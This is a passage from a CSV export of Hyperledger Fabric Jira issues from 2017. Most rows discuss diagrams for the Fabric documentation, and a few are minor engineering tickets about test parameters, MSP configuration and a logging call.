Yes, we need the network not to appear as bold - it might be nice to try, as you suggest to just put a line around it, and remove the shading. 

 

(btw, applications always connect with *something*** - that's the point - we're trying to get across the concept - and that can reveal peers etc later. ** Think about your web application with an IP address.  There is a myriad of structure between you and the application you consume - routers, servers, firewalls, IP sprayers and much, much more - but you need to worry about *none* of from a conceptual POV.  The network designer however....;;;","30/Jun/17 5:52 PM;odowdaibm;# The ledger is cleaner that way than pseudo 3D, so that's good.
 # Could we try a box around the ledger to show it as having a single form that includes a set of blocks?  It really going to help if we can expand the abstraction to contain world state and blockchain transaction log.
 # Could we try a more definite line around the Blockchain network
 # Application developer identity should now just be identity or digital certificate, if the application developer is not going to be shown on the diagram.  (I'm OK with them not being shown.);;;","14/Jul/17 4:20 AM;SarahMills;ready to be inserted;;;",,,,,,,,,,,,,,,,,,,,,,,,,
Writing First App / How Applications Interact with the Network - Graphic,FAB-4753,18045,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,SarahMills,SarahMills,SarahMills,15/Jun/17 11:00 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jun/17 4:42 AM,,,,,,,,,,,,0,,,,,,,h2. http://fabricstaging.readthedocs.io/en/latest/write_first_app.html#how-applications-interact-with-the-network,,markparz,nickgaski,odowdaibm,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 11:01 PM;SarahMills;How Applications Interact with the Network.png;https://jira.hyperledger.org/secure/attachment/11096/How+Applications+Interact+with+the+Network.png",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2zb:",,,,,,,,,,,,,,,,,,,,,,,markparz,nickgaski,odowdaibm,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 11:01 PM;SarahMills;[~odowdaibm] I added a graphic for the SDK as that was what is being discussed in the text, let me know what you think;;;","16/Jun/17 8:12 PM;odowdaibm;Hello Sarah,

 

Thanks for this.  I think the symbol for an SDK is fine, but I don't think it adds anything in this diagram.  We're also missing the identity, which is very important.;;;","16/Jun/17 10:08 PM;SarahMills;Thanks for responses [~odowdaibm]—I am curious about the placement of the images in relation to the text (a good example being that in the text for this image, it is discussing the API/SDK stuff specifically but nothing on this page mentions identity that I have seen). Is the text going to change?;;;","16/Jun/17 10:12 PM;odowdaibm;thanks - the text hasn't changed, and quote a few people have see it, and commented.  You prompt an interesting thought though - are you thinking of some kind of visual assist to make the text more meaningful? e.g. a BANG for notify or COGS for run smart contract?  (I'm not suggesting these, just trying to illustrate the point.);;;","16/Jun/17 10:20 PM;SarahMills;I am glad you asked this! Yes, I have been working towards the scenario of someone reading the documentation, and the illustration is placed with its respective content to clarify the concepts. This is the most accessible way as people would use a visual to make sure they are understanding what has just been said, but if that person is blind/low-vision, the concepts are not entirely dependent on graphic representation.

So yes, I was assuming that the text would refer to the image or that the image would clarify what had just been discussed in the documentation.;;;","17/Jun/17 5:38 AM;markparz;Says run the smart contract on the line, but the smart contract is in the bubble on the right... may call smart contract?;;;","19/Jun/17 1:17 PM;seanbarclay;see comments on the diagram here: https://jira.hyperledger.org/browse/FAB-4752?focusedCommentId=26708&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-26708

 

[~nickgaski] [~joe-alewine] [~markparz] i feel like we're still confusing the viewer with *SDK* (both as an icon and concept). Would *Middleware* or *Server-side* app running HF be a better fit? Because that's what's really handling the communication from the client application and the peer on the bc network.;;;","20/Jun/17 8:25 AM;nickgaski;Sean I completely agree.  We need server/side app+SDK and then some sort of client side apparatus to drive your application, then you have smart contracts and fabric entities on the back end.  Honestly the little diagram in the marbles repo is perfect.  Look at ""Application Communication Flow""

https://github.com/IBM-Blockchain/marbles#application-communication-flow;;;","20/Jun/17 10:57 AM;markparz;Yup, that is what I was saying but not properly;;;","20/Jun/17 5:30 PM;odowdaibm;We need this diagram to get across concepts, not topology.  Putting in details like server side app etc comes later.  When I write my program, I have no need to know this at all.

 

And just for perspective, the server side nature would be on the LHS, as that's to do with the structure of the App.  SDK, Server side etc etc are all details that don't need to be mentioned on this diagram.;;;","20/Jun/17 7:41 PM;SarahMills;Hi [~odowdaibm]:

The text surrounding this graphic seems very API/SDK focused: 
{quote}Applications use *APIs* to invoke smart contracts (link) and receive ledger queries and updates. These smart contracts are hosted in the network and identified by name and version.

APIs are accessible with a software development kit (SDK). For purposes of this exercise, we will be using fabric-sdks, though there is also a Java SDK and CLI that can be used to develop applications.

The various components (peers, nodes, containers) of a blockchain network all have separate IP addresses and ports. Applications must know those IP addresses so they can connect to the correct components.
{quote}
Is that going to change? I can see that I need to make sure to have the endpoints in this one, but should the graphic not address the SDK?;;;","20/Jun/17 9:06 PM;odowdaibm;Hi Sarah,

 

I guess I see it a bit like saying ""Program Code"" inside the box marked application.  It's just not necessary detail at this point.  Every product I've ever used has an SDK - all programmers know this.  They might call it a library or SDK or service interface ... but it's just mechanics.  There's nothing conceptual.  We can introduce later, but we don't need it on this diagram.

 

By the same token, I'm absolutely fine having endpoints on this diagram, or deferring them.  The point is that we've got applications, users and their identities.  We've got a network with smart contracts and ledgers.  We've got 2 key interactions - run a smart contract, and get notified when the ledger changes.  That's it.  

 

 ;;;","20/Jun/17 11:41 PM;SarahMills;I feel like I am missing something. If the introduction of the SDK in the text is not important enough to represent visually, I am not sure why this graphic is necessary—it is repeating the same visuals as the one above it, only with the addition of endpoints (which could just be added to the first).

 

My main concern is that the graphics are representing things that are not mentioned in the text (like the developer identity) and should someone not be able to see the images, they will not know this part. ;;;","20/Jun/17 11:54 PM;odowdaibm;Agreed, SDK shouldn't be on it, but developer (userID) definitely should be.  We probably need some way to transcribe the key...;;;","30/Jun/17 5:53 PM;odowdaibm;I don't really see the value of this diagram to be honest. It's just saying that there's this thing called an SDK, but as [~tkuhrt] said, cogs don't represent an SDK to most developers, and an SDK doesn't sit where shown.;;;","30/Jun/17 6:06 PM;SarahMills;[~odowdaibm] This one has been removed, I marked it as done but should prob find a way to delete it;;;","30/Jun/17 6:27 PM;odowdaibm;Aha, OK - no worries - and thanks!;;;",,,,,,,,,,,,,,,,,,,,,,
Writing First App / Querying the Ledger - Graphic,FAB-4755,18049,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,SarahMills,SarahMills,15/Jun/17 11:08 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Sep/17 10:30 PM,,,,,,,,,,,,0,,,,,,,http://fabricstaging.readthedocs.io/en/latest/write_first_app.html#querying-the-ledger,,markparz,SarahMills,zgalvin123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 4:43 AM;SarahMills;Querying the Ledger.png;https://jira.hyperledger.org/secure/attachment/11505/Querying+the+Ledger.png","30/Jun/17 4:45 AM;SarahMills;Querying the Ledger.svg;https://jira.hyperledger.org/secure/attachment/11510/Querying+the+Ledger.svg",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2zj:",,,,,,,,,,,,,,,,,,,,,,,markparz,SarahMills,zgalvin123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/17 3:11 AM;SarahMills;I am questioning the use of endpoint here and wonder if it's too early to just put the peer representation?;;;","17/Jun/17 5:39 AM;markparz;Lost the SDK;;;","01/Jul/17 11:27 PM;zgalvin123;I think the endpoint is important because the type of person who takes the time out of their day to read through Hyperledger Fabric documentation is very interested in how it works and, leaving the endpoint, abstracts it to a level that would just cause confusion/curiosity. If I saw that, I would spend the next hour researching how the application actually connects to the network. I think the diagram is perfect! ;;;","14/Jul/17 4:21 AM;SarahMills;ready to be inserted;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Writing First App / Updating the Ledger - Graphic,FAB-4756,18050,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,SarahMills,SarahMills,15/Jun/17 11:08 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Sep/17 10:30 PM,,,,,,,,,,,,0,,,,,,,http://fabricstaging.readthedocs.io/en/latest/write_first_app.html#updating-the-ledger,,markparz,SarahMills,zgalvin123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 4:43 AM;SarahMills;Updating the Ledger.png;https://jira.hyperledger.org/secure/attachment/11506/Updating+the+Ledger.png","30/Jun/17 4:46 AM;SarahMills;Updating the Ledger.svg;https://jira.hyperledger.org/secure/attachment/11511/Updating+the+Ledger.svg",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2zr:",,,,,,,,,,,,,,,,,,,,,,,markparz,SarahMills,zgalvin123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 5:36 AM;markparz;This one is in a scary middle position IMO... we aren't high level enough to just showing the app sends in and gets stuff at the end, and we're not deep enough to show the app sends proposal (via sdk, which we lost ) , gets endorsed responses, sends transaction to order(no orderer shown, it's pointing to a peer instead) then we have some stuff just floating in the bubble, and there is no sequencing info... I'd propose to go higher level and number the movements, and in the doc, we could point to ""more indepth transaction flow info"" and link to the transaction model.;;;","01/Jul/17 11:32 PM;zgalvin123;I agree with [~markparz]. What if we did 
 # Propose Update Transaction
 # Send Endorsed Update Transaction
 # Notify Ledger Update

That might make more sense to describe how the transaction flows between the application and the ledger.;;;","14/Jul/17 4:21 AM;SarahMills;ready to be inserted;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Writing First App / How Applications Connect to the Network - Graphic,FAB-4757,18051,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,SarahMills,SarahMills,SarahMills,15/Jun/17 11:09 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jun/17 4:44 AM,,,,,,,,,,,,0,,,,,,,,,markparz,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/17 12:39 AM;SarahMills;How Applications Connect to the Network.png;https://jira.hyperledger.org/secure/attachment/11100/How+Applications+Connect+to+the+Network.png",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2zz:",,,,,,,,,,,,,,,,,,,,,,,markparz,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/17 12:40 AM;SarahMills;[~odowdaibm] I know this doesn't quite capture the partitioned room...but it's a first draft. ;;;","17/Jun/17 5:33 AM;markparz;Too much in here... Peer not participating, channels, and not sure what the yellow/green bubble really is representing.. .the network would have other things, maybe just 1 channel with the lines between and dump the bubble?;;;","19/Jun/17 1:26 PM;seanbarclay;i think this is a cool idea but agree with [~markparz] it's too much. 

i think this is one part where animation would be really helpful because we're trying to have the graphic do too much. it really needs to be two or three diagrams.

I would isolate parts further in the network and remove the bits on the left. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Writing First App / Running the Sample - Graphic,FAB-4758,18052,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,SarahMills,SarahMills,15/Jun/17 11:10 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Sep/17 10:30 PM,,,,,,,,,,,,0,,,,,,,http://fabricstaging.readthedocs.io/en/latest/write_first_app.html#running-the-sample,,markparz,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 4:45 AM;SarahMills;Running the Sample.png;https://jira.hyperledger.org/secure/attachment/11507/Running+the+Sample.png","30/Jun/17 4:45 AM;SarahMills;Running the Sample.svg;https://jira.hyperledger.org/secure/attachment/11508/Running+the+Sample.svg",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy307:",,,,,,,,,,,,,,,,,,,,,,,markparz,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 5:30 AM;markparz;Groovy;;;","19/Jun/17 1:35 PM;seanbarclay;I think we need to tighten the relationships a bit more. e.g. to pair better with the code and make things more intuitive, perhaps we show how the CreateCar function in the Smart Contract was triggered- and how that led to the car on the right being Audi, Q7, Red, Sarah. 

Aesthetically, the car just feels like it doesn't belong visually with the rest. The ledger being dimensional also doesn't feel consistent. ;;;","14/Jul/17 4:21 AM;SarahMills;ready to be inserted;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduction / A Distributed Ledger - Graphic,FAB-4759,18054,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,SarahMills,SarahMills,15/Jun/17 11:11 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Feb/18 1:32 AM,,,,,,,,,,,,0,,,,,,,http://fabricstaging.readthedocs.io/en/latest/blockchain.html#what-is-a-blockchain,,markparz,SarahMills,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 6:41 PM;SarahMills;A Distributed Ledger.png;https://jira.hyperledger.org/secure/attachment/11517/A+Distributed+Ledger.png","16/Jun/17 7:48 AM;yuleeandrea;A Distributed Ledger.png;https://jira.hyperledger.org/secure/attachment/11171/A+Distributed+Ledger.png","16/Jun/17 2:06 AM;SarahMills;A Distributed Ledger.png;https://jira.hyperledger.org/secure/attachment/11108/A+Distributed+Ledger.png","30/Jun/17 6:42 PM;SarahMills;A Distributed Ledger.svg;https://jira.hyperledger.org/secure/attachment/11521/A+Distributed+Ledger.svg",,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy30n:",,,,,,,,,,,,,,,,,,,,,,,markparz,SarahMills,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 5:29 AM;markparz;too many things around the building icons... what is in the talking bubble? is that a folder?;;;","14/Jul/17 4:22 AM;SarahMills;ready to be inserted;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduction / Smart Contracts - Graphic,FAB-4760,18055,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,SarahMills,SarahMills,15/Jun/17 11:11 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Feb/18 1:33 AM,,,,,,,,,,,,0,,,,,,,,,markparz,SarahMills,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 6:41 PM;SarahMills;Smart Contracts.png;https://jira.hyperledger.org/secure/attachment/11518/Smart+Contracts.png","16/Jun/17 7:48 AM;yuleeandrea;Smart Contracts.png;https://jira.hyperledger.org/secure/attachment/11170/Smart+Contracts.png","16/Jun/17 2:07 AM;SarahMills;Smart Contracts.png;https://jira.hyperledger.org/secure/attachment/11109/Smart+Contracts.png","30/Jun/17 6:42 PM;SarahMills;Smart Contracts.svg;https://jira.hyperledger.org/secure/attachment/11522/Smart+Contracts.svg",,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy30v:",,,,,,,,,,,,,,,,,,,,,,,markparz,SarahMills,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 2:18 AM;tkuhrt;The words ""access to the ledger"" make it look like the transactions have access to the ledger.  Maybe change to  ""written to the ledger"".;;;","17/Jun/17 5:28 AM;markparz;going right to left seems a little odd, and not sure what the pie shape under the peer represents.;;;","14/Jul/17 4:22 AM;SarahMills;ready to be inserted;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduction / Consensus - Graphic,FAB-4761,18056,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,nickgaski,SarahMills,SarahMills,15/Jun/17 11:12 PM,23/Jan/20 6:51 AM,28/Oct/23 3:00 AM,23/Jan/20 6:51 AM,,,,,,,,,,,,0,stale-item,,,,,,,,ChristopherFerris,dlesaca,markparz,SarahMills,swinslow,sykesm,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 6:43 PM;SarahMills;Consensus_1.png;https://jira.hyperledger.org/secure/attachment/11524/Consensus_1.png","16/Jun/17 7:49 AM;yuleeandrea;Consensus_1.png;https://jira.hyperledger.org/secure/attachment/11177/Consensus_1.png","16/Jun/17 2:07 AM;SarahMills;Consensus_1.png;https://jira.hyperledger.org/secure/attachment/11110/Consensus_1.png","30/Jun/17 6:43 PM;SarahMills;Consensus_2.png;https://jira.hyperledger.org/secure/attachment/11525/Consensus_2.png","16/Jun/17 7:49 AM;yuleeandrea;Consensus_2.png;https://jira.hyperledger.org/secure/attachment/11176/Consensus_2.png","16/Jun/17 2:07 AM;SarahMills;Consensus_2.png;https://jira.hyperledger.org/secure/attachment/11111/Consensus_2.png","30/Jun/17 6:43 PM;SarahMills;Consensus_animation use.svg;https://jira.hyperledger.org/secure/attachment/11523/Consensus_animation+use.svg",,,,,,,,,,,,,,,,,,,,,,,"1|hzy313:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,dlesaca,markparz,SarahMills,swinslow,sykesm,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 5:22 AM;markparz;I like _2.png... if we can move the bottom transaction out of the circle like in _1.png images... and I'd like to title the image as consensus, but have the middle piece say 'ordered' or ordering service.... My personal opinion;;;","22/Jul/17 6:22 AM;dlesaca;I've been working on animating this and other diagrams using the [GSAP|https://greensock.com/products/] animation library. The coded animation can be found here: [https://codepen.io/dlesaca/pen/xrPaBZ?editors=1010|https://codepen.io/dlesaca/pen/xrPaBZ?editors=1010.]. The animations turned out great and I believe add a lot to the diagrams. One caveat to using this library is that part of the library requires a membership [subscription|https://greensock.com/club]. In order to use these animations within our documentation, a subscription will need to be purchased.

[~ChristopherFerris] and [~admarkel], I was told by [~yuleeandrea] that you might be able to help with this?

Thanks,
Dexter;;;","23/Jul/17 4:02 AM;ChristopherFerris;I think that [~tkuhrt] should be able to help. $150/year does not seem onerous. ;;;","24/Aug/17 5:58 AM;tkuhrt;[~dlesaca], [~ChristopherFerris]: Do we know how this license plays with the Creative Commons license that the Hyperledger Charter specifies for documentation? Would the license carry over as copies of that animation are handed off to others?;;;","13/Sep/17 8:24 PM;ChristopherFerris;[~tkuhrt] think we should ask [~swinslow];;;","13/Sep/17 11:11 PM;swinslow;Hi Chris and Tracy,

The Hyperledger IP policy requires that project documentation be contributed under the CC-BY-4.0 license, and code under Apache 2.0 (or under other open source licenses approved as an exception by the Governing Board).

It isn’t clear to me from the GreenSock website whether they permit the output from their tools to be relicensed under CC-BY-4.0. This sentence from their FAQs gives me pause, though: “You may not include any of the members-only bonus plugins/classes in your open source tool (for obvious reasons) and you must clearly represent that the GreenSock code uses its own separate licensing model.”

In the past I have seen a non-Hyperledger project try to use GreenSock, though I don’t know the specific context of their use. It resulted in the project code containing a number of comments stating that it was subject to GreenSock’s commercial terms of use.;;;","23/Jan/20 6:51 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduction / Today’s Systems of Record - Graphic,FAB-4762,18057,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,nickgaski,SarahMills,SarahMills,15/Jun/17 11:13 PM,23/Jan/20 6:51 AM,28/Oct/23 3:00 AM,23/Jan/20 6:51 AM,,,,,,,,,,,,0,stale-item,,,,,,,,dlesaca,joe-alewine,lucie,markparz,SarahMills,sykesm,zgalvin123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 1:48 PM;lucie;Todays System of Record v2.png;https://jira.hyperledger.org/secure/attachment/11514/Todays+System+of+Record+v2.png","16/Jun/17 1:39 PM;lucie;Todays-System-of-Record.png;https://jira.hyperledger.org/secure/attachment/11178/Todays-System-of-Record.png",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy31b:",,,,,,,,,,,,,,,,,,,,,,,dlesaca,joe-alewine,lucie,markparz,SarahMills,sykesm,zgalvin123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 5:19 AM;markparz;Inefficient is that there is a single point of control, that everyone has to deal with for updates, and can easily get out of sync, not that they all have records.;;;","20/Jun/17 2:25 AM;joe-alewine;Mentioned on the call that it might make sense for each of the participants in this image to have a noticeably *different* ledger (different color or different look or what have you). Then in the ""blockchain difference"" image show that each participant now has the same ledger. It's these individual ledgers that represent single points of failure.

The thing (building?"") at the center here would be, what? Something like the DTCC (which establishes provenance for stock/mortgage trades)? The problem here is that without a ledger that each participant has a copy of this process is extremely laborious. And also that for the majority of real-world transactions, there is no DTCC to help establish provenance.;;;","01/Jul/17 11:17 PM;zgalvin123;Ok, so I am trying to think this through and I think it's helpful to distinguish between the two issues with current systems. 
 # Trusting a single party to house and protect the data
 # With each party having their own database of overlapping data, there will be inconsistencies amongst these systems. 

The latter issue includes the first issue because the inconsistency is a result of having an individual party responsible for maintaining and protecting the data. Thus, I think it would be best to focus on the latter example.

I'm not exactly sure how to do this but I agree with [~joe-alewine] about having different databases of different colors or maybe a line connecting the two databases with a 'not equal' sign in the middle or clashing arrows, such as this photo [https://cdn2.iconfinder.com/data/icons/arrows-56/98/14-arrow-together-left-up-2-512.png], to represent the inconsistency between the databases. Does that make sense? Either way, this is a great start! ;;;","01/Aug/17 6:55 AM;lucie;[~joe-alewine] [~yuleeandrea] [~dlesaca]

We want to add some more text in the content that goes along with this diagram to better describe what is going on. Basically an explanation of the animation. It may go after the paragraph that starts with ""Modern technology has taken this process..."" Feel free to re-word it in order for it to fit with the rest of the text.

In the current system, participants are part of a network but retain their own record of the ledger. Ledgers are not shared in any way. This may lead to inaccurate records. In the above diagram, we can see how the participants in the network have a transacttion that is passed between each of them. After this transaction goes through each participant, they make a record of the transaction in a their ledger. However, one participant puts down the record wrong, which can be caused by a communication error or it could have been done intentionally. When this occurs, the rest of the participants do not receive the correct record and the participants are all misaligned. This kind of recording is time consuming and inaccurate. If only there was a better way…;;;","24/Aug/17 5:17 AM;dlesaca;[~nickgaski] [~joe-alewine]

Animation hosted on Code Pen: [https://codepen.io/dlesaca/pen/QMwVNq?editors=0010];;;","24/Aug/17 5:41 AM;joe-alewine;[~markparz] 

Take a look at Dexter's comment above.;;;","23/Jan/20 6:51 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduction / The Blockchain Difference - Graphic,FAB-4763,18058,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,nickgaski,SarahMills,SarahMills,15/Jun/17 11:13 PM,23/Jan/20 6:51 AM,28/Oct/23 3:00 AM,23/Jan/20 6:51 AM,,,,,,,,,,,,0,stale-item,,,,,,,,dlesaca,joe-alewine,markparz,SarahMills,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 1:48 PM;lucie;The Blockchain Difference v2.png;https://jira.hyperledger.org/secure/attachment/11515/The+Blockchain+Difference+v2.png","16/Jun/17 1:39 PM;lucie;The-Blockchain-Difference.png;https://jira.hyperledger.org/secure/attachment/11179/The-Blockchain-Difference.png",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy31j:",,,,,,,,,,,,,,,,,,,,,,,dlesaca,joe-alewine,markparz,SarahMills,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 5:16 AM;markparz;I don't like the provenance block... and we lost 'shared ledger' and I don't know what the icons mean in the circle;;;","20/Jun/17 2:27 AM;joe-alewine;See comments to ""today's systems of record"" image. :);;;","24/Aug/17 5:19 AM;dlesaca;[~nickgaski] [~joe-alewine]

Animation hosted on CodePen: [https://codepen.io/dlesaca/pen/zdjrRg?editors=0110];;;","24/Aug/17 5:53 AM;joe-alewine;[~markparz]

Take a look at Dexter's graphic above.;;;","23/Jan/20 6:51 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger Traffic Engine(LTE): Re-arrange test parameter setup ,FAB-4764,18061,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,15/Jun/17 11:29 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Sep/17 6:05 AM,,,,v1.0.0,,,,,,,,0,,,,,,,"Rearrange the parameter setup so that the parameter file has more control over the test iterations. Right now the parameter file only controls the starting parameters but not the iteration parameters.

Also, make the parameter file an option to the test driver script. ",,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy31r:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jun/17 10:07 PM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/10713/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
GetVerifyingMspConfig includes signercert,FAB-4765,18067,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,15/Jun/17 11:58 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Jun/17 9:35 PM,,,,v1.0.0,,fabric-crypto,,,,,,0,,,,,,,"{{GetVerifyingMspConfig}} uses the same {{getMspConfig}} underlying function as {{GetLocalMspConfig}}.  Consequently, it treats missing a signer cert dir as a fatal error.  For a verifying MSP, no signer cert is needed (and in fact, it is non-sensical).",,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy31z:",,,,,,,,,,,,,,,,,,,,,,,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/17 12:44 AM;jyellick;Resolved via: https://gerrit.hyperledger.org/r/#/c/10639/;;;","16/Jun/17 9:35 PM;mastersingh24;merged;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
No need to add error variable to log printout in case of nil,FAB-4766,18068,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,16/Jun/17 12:32 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Jun/17 7:19 AM,v1.0.0-alpha2,,,v1.0.0,v1.0.0-rc1,fabric-peer,,,,,,0,peer,,,,,,"{code}
		if cds.CodePackage == nil {
			//no code bytes for these situations
			if !(chaincodeSupport.userRunsCC || cds.ExecEnv == pb.ChaincodeDeploymentSpec_SYSTEM) {
				ccpack, err := ccprovider.GetChaincodeFromFS(cID.Name, cID.Version)
				if err != nil {
					return cID, cMsg, err
				}

				cds = ccpack.GetDepSpec()
				chaincodeLogger.Debugf(""launchAndWaitForRegister fetched %d bytes from file system"", len(cds.CodePackage), err)
			}
		}
{code}

The logging printout

{code}
				chaincodeLogger.Debugf(""launchAndWaitForRegister fetched %d bytes from file system"", len(cds.CodePackage), err)

{code}

